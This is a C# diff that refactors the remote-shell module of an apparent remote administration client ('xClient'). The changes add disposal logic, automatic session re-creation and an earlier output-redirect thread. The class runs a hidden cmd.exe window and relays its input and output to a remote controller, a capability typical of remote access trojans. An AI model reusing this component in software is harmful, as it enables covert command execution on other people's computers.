@@ -1,16 +1,18 @@
 ﻿using System;
 using System.Diagnostics;
+using System.IO;
 using System.Threading;
 
 namespace xClient.Core.RemoteShell
 {
-    public class Shell
+    public class Shell : IDisposable
     {
         private Process _prc;
         private bool _read;
 
         private void CreateSession()
         {
+            _read = true;
             _prc = new Process
             {
                 StartInfo = new ProcessStartInfo("cmd")
@@ -20,16 +22,18 @@ namespace xClient.Core.RemoteShell
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     CreateNoWindow = true,
-                    WorkingDirectory = @"C:\",
+                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                     Arguments = "/K"
                 }
             };
 
             _prc.Start();
+            new Thread(Redirect).Start();
+
+            Thread.Sleep(100);
+
             new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(
                 Program.ConnectClient);
-
-            new Thread(Redirect).Start();
         }
 
         private void Redirect()
@@ -61,8 +65,10 @@ namespace xClient.Core.RemoteShell
 
         public bool ExecuteCommand(string command)
         {
-            if (_prc.HasExited)
-                return false;
+            if (_prc == null || _prc.HasExited)
+                CreateSession();
+
+            if (_prc == null) return false;
 
             _prc.StandardInput.WriteLine(command);
             _prc.StandardInput.Flush();
@@ -72,49 +78,35 @@ namespace xClient.Core.RemoteShell
 
         public Shell()
         {
-            _read = true;
             CreateSession();
         }
 
-        ~Shell()
+        public void Dispose()
         {
-            _read = false;
-            try
-            {
-                if (_prc != null && !_prc.HasExited)
-                {
-                    _prc.Kill();
-                    _prc.Dispose();
-                    _prc = null;
-                    new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(
-                        Program.ConnectClient);
-                }
-            }
-            catch
-            {
-            }
+            Dispose(true);
+
+            GC.SuppressFinalize(this);
         }
 
-        public void CloseSession()
+        protected virtual void Dispose(bool disposing)
         {
-            _read = false;
-            try
+            if (disposing)
             {
-                if (_prc != null && !_prc.HasExited)
+                try
                 {
-                    _prc.Kill();
-                    _prc.Dispose();
-                    _prc = null;
-                    new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(
-                        Program.ConnectClient);
+                    _read = false;
+                    if (_prc != null)
+                    {
+                        if (!_prc.HasExited)
+                            _prc.Kill();
+                        _prc.Dispose();
+                        _prc = null;
+                    }
+                    GC.SuppressFinalize(this);
                 }
-
-                // The session has already been closed, so there is no reason to make
-                // the garbage collector waste lots of time finalizing it.
-                GC.SuppressFinalize(this);
-            }
-            catch
-            {
+                catch
+                {
+                }
             }
         }
     }
